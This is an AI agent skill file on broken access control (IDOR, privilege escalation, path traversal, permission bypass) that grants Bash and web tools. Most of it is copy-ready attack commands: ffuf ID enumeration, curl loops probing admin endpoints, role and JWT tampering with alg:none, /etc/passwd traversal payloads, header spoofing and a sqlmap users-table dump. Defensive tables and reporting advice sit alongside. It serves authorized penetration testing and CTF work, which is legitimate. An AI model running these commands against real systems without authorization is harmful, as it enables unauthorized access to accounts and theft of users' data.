---
name: web-access-control
description: "Broken Access Control (OWASP Top 10 2025 - A01) attacks and defense — covering core attack surfaces including IDOR (Insecure Direct Object Reference), vertical/horizontal privilege escalation, path traversal, and permission bypass."
origin: openclaw
version: "0.1.18"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 6
  guide_count: 5
  owasp: "A01:2021-Broken Access Control"
---




# Skill: Broken Access Control

> **Supplementary Files**:
> - `payloads.md` — Payload collection organized by 7 major attack types (IDOR, privilege escalation, path traversal, forced browsing, parameter tampering, HTTP method tampering, header spoofing)
> - `test-cases.md` — Structured test case templates (13 cases covering IDOR, privilege escalation, path traversal, forced browsing — 4 categories)
> - `access-control-guide.md` — Complete guide to Broken Access Control (attack types, detection techniques, exploitation methods, defense strategies)

## Summary

Web Access Control skill domain covering web attack operations.

**Tools**: Burp Suite, ffuf, Autorize, curl, sqlmap, fimap

**Domain**: web-attack

**OWASP**: A01:2021-Broken Access Control

## Description

Broken Access Control (OWASP Top 10 2025 - A01) attacks and defense — covering core attack surfaces including IDOR (Insecure Direct Object Reference), vertical/horizontal privilege escalation, path traversal, and permission bypass. This skill covers the complete attack chain from discovery to exploitation, as well as RBAC/ABAC defense systems.

**Agent Capability Statement**: Proficient in automated IDOR detection, multi-dimensional privilege escalation testing, path traversal bypass techniques, with a complete payload library and automation scripts.

## Use Cases

1. **Web Application Penetration Testing** - Detect access control vulnerabilities in target applications, identify unauthorized access paths and IDOR endpoints
2. **API Security Testing** - Perform horizontal/vertical privilege escalation testing against REST APIs, enumerate hidden admin endpoints
3. **CTF Competition Problem Solving** - Quickly identify access control challenge types such as IDOR, path traversal, permission bypass, and construct effective attack payloads
4. **Security Code Audit** - Review application authorization logic from a defense perspective, identify missing permission checks
5. **Permission Model Design Review** - Evaluate whether RBAC/ABAC implementation is complete, identify boundary condition vulnerabilities

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Burp Suite** | Intercept and modify requests, permission comparison testing, Autorize plugin for automatic privilege escalation detection | Professional edition + Autorize extension |
| **ffuf** | IDOR endpoint fuzzing, parameter brute force, path enumeration | `ffuf -u "URL/FUZZ" -w wordlist.txt` |
| **Autorize** (Burp Plugin) | Automatically compare high/low privilege user responses, detect privilege escalation | Configure two session cookies for automatic replay |
| **curl** | Quickly construct requests, parameter tampering, HTTP method testing | `curl -X PUT -H "Cookie: ..." URL` |
| **sqlmap** | Assist in extracting user IDs and permission data for privilege escalation testing | `sqlmap --dump -T users` |
| **fimap** | Automated path traversal / LFI detection | `fimap -u "URL?file=test"` |
| **Manual Analysis** | Understand authorization logic, identify ID parameter patterns, design attack chains | Browser DevTools + Burp Repeater |

## Methodology

### Attack Chain

```
Recon → IDOR Discovery → Privilege Escalation → Forced Browsing → Parameter Tampering
```

**1. Recon**
- Crawl all API endpoints, record URLs containing ID parameters (user_id, order_id, file_id, etc.)
- Identify authentication mechanisms: Cookie / JWT / API Key / OAuth Token
- Build role matrix: functions and resources visible to each role

**2. IDOR Discovery**
- Replace numeric IDs: `?id=123` -> `?id=124` (iterate adjacent IDs)
- Replace string IDs: `?user=alice` -> `?user=bob`
- Replace UUIDs: observe if there are predictable UUID patterns
- Bulk automation: use ffuf to fuzz ID parameters

**3. Privilege Escalation**
- Vertical privilege escalation: regular user directly accessing `/admin/*` admin endpoints
- Role parameter tampering: `?role=user` -> `?role=admin`, JSON body `"role":"admin"`
- Cookie/JWT tampering: modify `isAdmin`, `role`, `access_level` claims
- HTTP method tampering: POST -> GET / PUT / DELETE, bypass method-level permission controls

**4. Forced Browsing**
- Directory enumeration: `/admin/`, `/console/`, `/management/`, `/api/v2/admin/`
- File type probing: `/backup.sql`, `/users.csv`, `/.env`
- API version probing: `/api/v1/admin` vs `/api/v2/admin`

**5. Parameter Tampering**
- Case obfuscation: `/Admin/Delete` -> `/ADMIN/delete` -> `/aDmIn/dElEtE`
- URL encoding bypass: `/%61dmin/%64elete` -> decodes to `/admin/delete`
- Path parameter obfuscation: `/admin;/dashboard`, `/admin/./dashboard`, `/admin%00/dashboard`
- Header spoofing: `X-Original-URL`, `X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization`

### Defense Perspective

| Defense Measure | Description | Priority |
|-----------------|-------------|----------|
| RBAC (Role-Based Access Control) | Assign permissions by role, server-side enforcement of role checking for every request | CRITICAL |
| ABAC (Attribute-Based Access Control) | Dynamic decisions combining user attributes, resource attributes, and environmental conditions | HIGH |
| Server-Side Permission Validation | Every endpoint must verify that the current user has the right to access the target resource | CRITICAL |
| Indirect Object References | Use mapping tables instead of directly exposing internal IDs to prevent IDOR | HIGH |
| Deny by Default | Deny all access not explicitly authorized; use allowlist policies | CRITICAL |
| Rate Limiting | Limit ID parameter enumeration frequency to prevent bulk traversal | MEDIUM |
| Logging and Monitoring | Record all access control failure attempts, set alert thresholds | HIGH |
| JWT Strict Validation | Verify signature, expiration time, issuer; do not trust client claims | HIGH |

## Practical Steps

> **For detailed payloads see `payloads.md`, and for the complete test checklist see `test-cases.md`.** Below is a summary of core operations for each phase.

### Step 1: IDOR Detection (ffuf Automation)

```bash
# Enumerate user ID endpoints
ffuf -u "http://target/api/v1/users/FUZZ/profile" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -H "Cookie: session=YOUR_TOKEN" \
     -fc 403,404 -mc 200

# Iterate numeric ID ranges
ffuf -u "http://target/api/v1/users/FUZZ/orders" \
     -w <(seq 1 1000) \
     -H "Cookie: session=YOUR_TOKEN" \
     -fc 403,404

# Test IDOR on POST requests
ffuf -u "http://target/api/v1/orders" \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Cookie: session=YOUR_TOKEN" \
     -d '{"user_id": FUZZ, "action": "view"}' \
     -w <(seq 1 500) \
     -fc 403,404
```

### Step 2: Privilege Escalation Testing

```bash
# Use regular user session to access admin endpoints
ADMIN_ENDPOINTS=("/admin" "/administrator" "/manage" "/console" "/dashboard"
  "/admin/users" "/admin/settings" "/admin/config" "/admin/logs"
  "/api/v1/admin/users" "/api/internal/debug")

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=$USER_TOKEN" \
    "http://target$endpoint")
  if [ "$STATUS" != "403" ] && [ "$STATUS" != "401" ] && [ "$STATUS" != "404" ]; then
    echo "[+] $endpoint -> $STATUS (possible privilege escalation)"
  fi
done

# Role parameter tampering test
curl -s -H "Cookie: session=$USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin","user_id":123}' \
     "http://target/api/v1/users/update"

# JWT claims tampering (requires algorithm confusion attack)
# Modify {"role":"user"} to {"role":"admin"}, sign with alg:none
```

### Step 3: Path Traversal Testing

```bash
# Basic path traversal
curl "http://target/file?name=../../../etc/passwd"

# URL encoding bypass
curl "http://target/file?name=..%2f..%2f..%2fetc/passwd"
curl "http://target/file?name=..%252f..%252f..%252fetc/passwd"

# Double encoding bypass
curl --path-as-is "http://target/..%252f..%252f..%252fetc/passwd"

# Unicode bypass
curl "http://target/file?name=..%c0%ae%c0%ae%c0%afetc/passwd"

# Windows target
curl "http://target/file?name=..\\..\\..\\windows\\win.ini"

# Use ffuf for bulk path traversal payload testing
ffuf -u "http://target/file?name=FUZZ" \
     -w path_traversal_payloads.txt \
     -fc 403,404 -mc 200 \
     -fs 0
```

### Step 4: API Endpoint Enumeration and Bypass

```bash
# HTTP method tampering
for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" -H "Cookie: session=$USER_TOKEN" \
    "http://target/admin/delete_user?id=1")
  echo "[$method] -> $STATUS"
done

# Header spoofing bypass
curl -H "X-Original-URL: /admin/dashboard" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/"
curl -H "X-Custom-IP-Authorization: 127.0.0.1" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/admin"
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: localhost" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/admin"

# Case obfuscation
curl "http://target/Admin/Dashboard"
curl "http://target/ADMIN/DELETE_USER"

# Path parameter obfuscation
curl "http://target/admin;/dashboard"
curl "http://target/admin/./dashboard"
curl --path-as-is "http://target/admin%00/dashboard"
```

## Detection Methods

Effective access control testing begins with mapping the complete authorization surface. Automated diff comparison between low-privilege and high-privilege session responses (using Burp Autorize or custom scripts) rapidly identifies endpoints missing authorization checks. Parameter enumeration through ffuf with sequential ID wordlists detects IDOR at scale, while HTTP method fuzzing across all discovered endpoints reveals method-level permission gaps that manual testing often misses.

## Common Pitfalls

A common mistake in access control testing is only testing vertical privilege escalation (user-to-admin) while neglecting horizontal escalation (user-to-user). Many applications enforce admin boundaries but fail to validate that user A cannot access user B's resources. Another pitfall is testing only GET requests — POST/PUT/DELETE endpoints frequently have weaker authorization checks. Always test every HTTP method against every role, and iterate through predictable ID patterns rather than testing only a handful of random values.

## Automation and Scripting

Automated access control testing scales manual techniques across hundreds of endpoints. Python scripts wrapping curl or requests can perform systematic role-matrix testing: for each endpoint, test each role and diff responses to flag unauthorized access. Burp Suite's Autorize extension automates this by replaying every request with different session tokens and comparing response codes and lengths. Custom ffuf wordlists derived from application-specific ID patterns enable rapid IDOR scanning at scale.

## Reporting

Access control findings must include clear evidence chains demonstrating the vulnerability. Each finding should document: the request with a low-privilege token accessing a restricted resource, the response proving unauthorized access (HTTP 200 with sensitive data), the business impact (data exposure, privilege escalation path), and a remediation recommendation specifying the missing authorization check. Screenshots of Autorize diff results and ffuf match output provide compelling visual evidence for stakeholders.

---

## Hacker Laws

1. **Minimize Attack Surface** - Every exposed endpoint, every enumerable ID, every unprotected admin path is an attack surface. Defenders should hide admin interfaces, use unpredictable indirect references, and uniformly enforce access control at the gateway layer. Attackers aim to discover all hidden endpoints and parameters.

2. **Least Privilege** - Users should only have the minimum set of permissions needed to complete their current task. When applications grant overly broad permissions to regular users (such as directly exposing internal IDs, or front-end hiding without back-end validation), IDOR and privilege escalation vulnerabilities arise. Defenders should strictly validate each user's resource access permissions at every API endpoint.

3. **Trust but Verify** - Do not trust any data from the client: URL parameters can be tampered with (IDOR), Cookie/JWT claims can be forged (privilege escalation), HTTP headers can be injected (X-Forwarded-For bypass). All authorization decisions must be independently verified server-side based on trusted data sources.

4. **Assume Breach** - Assume an attacker has already obtained regular user privileges. Under this premise, can the defense system prevent lateral access to other users' data (horizontal privilege escalation) and vertical escalation to admin privileges? Multi-layer defense (RBAC + ABAC + log monitoring + Rate Limiting) ensures that a single control point failure does not lead to total compromise.

## Learning Resources

**Supplementary files for this skill**:
- `payloads.md` — Complete payload collection (7 major attack types, ready to copy and use)
- `test-cases.md` — Structured test cases (13 case templates with preconditions and expected results)
- `access-control-guide.md` — Complete guide to Broken Access Control (offensive and defensive code examples)

**Related skills**:
- `skills/web-auth-bypass/SKILL.md` — Authentication bypass (JWT tampering for privilege escalation, session management complementary to access control)
- `skills/api-security/SKILL.md` — API security testing (BOLA/BPLA are API forms of IDOR)
- `skills/web-sqli/SKILL.md` — SQL injection (can be used to extract user IDs and permission data to assist privilege escalation testing)

**External resources**:
- [OWASP Top 10 2025 - A01: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger Web Security Academy - Access Control](https://portswigger.net/web-security/access-control)
- [PortSwigger Web Security Academy - IDOR](https://portswigger.net/web-security/insecure-direct-object-references)
- [HackTricks - Broken Access Control](https://book.hacktricks.xyz/pentesting-web/idor)
- [OWASP Testing Guide - Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README)
- [Autorize Burp Extension](https://github.com/Quitten/Autorize)
